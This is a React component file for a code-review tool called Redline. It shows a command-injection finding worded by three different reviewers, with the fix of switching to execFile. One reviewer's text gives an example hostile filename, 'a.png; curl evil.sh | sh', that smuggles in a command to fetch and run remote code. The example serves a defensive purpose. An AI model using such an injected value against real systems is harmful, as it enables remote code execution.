"use client";

import Link from "next/link";
import { useState, type ReactNode } from "react";
import type { DiffLine } from "@/components/seed-excerpt";

// Three reviewers, one rule. The prose differs because three different models
// wrote it; the prefix does not, because Redline writes that part — the CLI
// composes `Redline/<SEVERITY> [<rule-id>]:` from validated JSON rather than
// letting a model free-type it (web/app/docs/local-review). The toggle exists
// to make that visible in one click, so it changes nothing else on the panel.
type Reviewer = {
  id: string;
  label: string;
  where: string;
  prose: ReactNode;
};

const REVIEWERS: Reviewer[] = [
  {
    id: "copilot",
    label: "GitHub Copilot",
    where: "review comment on the pull request",
    prose: (
      <>
        <code>body.filename</code> is interpolated into a shell command, so a
        crafted filename runs arbitrary code. Use{" "}
        <code>execFile(&apos;convert&apos;, [body.filename, &apos;-resize&apos;, &apos;100x100&apos;, &apos;out.png&apos;])</code>.
      </>
    ),
  },
  {
    id: "claude",
    label: "Claude",
    where: "review comment on the pull request",
    prose: (
      <>
        The uploaded filename reaches the shell unescaped — a file called{" "}
        <code>a.png; curl evil.sh | sh</code> is executed. Pass the arguments as
        an array instead:{" "}
        <code>execFile(&apos;convert&apos;, [body.filename, &apos;-resize&apos;, &apos;100x100&apos;, &apos;out.png&apos;])</code>.
      </>
    ),
  },
  {
    id: "local",
    label: "Local model",
    where: "redline review, on your machine",
    prose: (
      <>
        External input is concatenated into a shell string. Replace{" "}
        <code>exec</code> with <code>execFile</code> and pass an argv array:{" "}
        <code>execFile(&apos;convert&apos;, [body.filename, &apos;-resize&apos;, &apos;100x100&apos;, &apos;out.png&apos;])</code>.
      </>
    ),
  },
];

export function FindingPanel({
  diff,
  file,
  ruleId,
  ruleHref,
  severity,
}: {
  diff: DiffLine[];
  file: string;
  ruleId: string;
  ruleHref: string;
  severity: string;
}) {
  const [active, setActive] = useState(REVIEWERS[0]?.id ?? "");
  const reviewer = REVIEWERS.find((r) => r.id === active) ?? REVIEWERS[0];

  return (
    <div className="hm-find">
      <div className="hm-find-code">
        <div className="hm-panel-h">
          <span className="hm-panel-t">the diff</span>
          <code>{file}</code>
        </div>
        <pre className="hm-diff">
          {diff.map((line, i) => (
            <span className={`hm-dl hm-dl-${line.kind}`} key={`${i}-${line.text}`}>
              <span className="hm-dl-g" aria-hidden="true">
                {line.kind === "ctx" ? " " : "+"}
              </span>
              {line.text === "" ? " " : line.text}
              {"\n"}
            </span>
          ))}
        </pre>
      </div>

      <div className="hm-find-out">
        <div className="hm-panel-h">
          <span className="hm-panel-t">the finding</span>
          <span className="hm-panel-n">{reviewer?.where}</span>
        </div>
        <div className="hm-out">
          <p className="hm-out-prefix">
            <span className="hm-out-sev">Redline/{severity}</span>{" "}
            <span className="hm-out-id">
              [
              <Link href={ruleHref}>{ruleId}</Link>
              ]
            </span>
            :
          </p>
          <p className="hm-out-prose">{reviewer?.prose}</p>
        </div>

        <div className="hm-switch" role="group" aria-label="Which tool produced this finding">
          <span className="hm-switch-l">Found by</span>
          {REVIEWERS.map((r) => (
            <button
              type="button"
              key={r.id}
              className={`hm-switch-b${r.id === active ? " on" : ""}`}
              aria-pressed={r.id === active}
              onClick={() => setActive(r.id)}
            >
              {r.label}
            </button>
          ))}
        </div>
        <p className="hm-switch-cap">
          Same rule id whichever tool found it. That&apos;s what makes it
          countable.
        </p>
      </div>
    </div>
  );
}
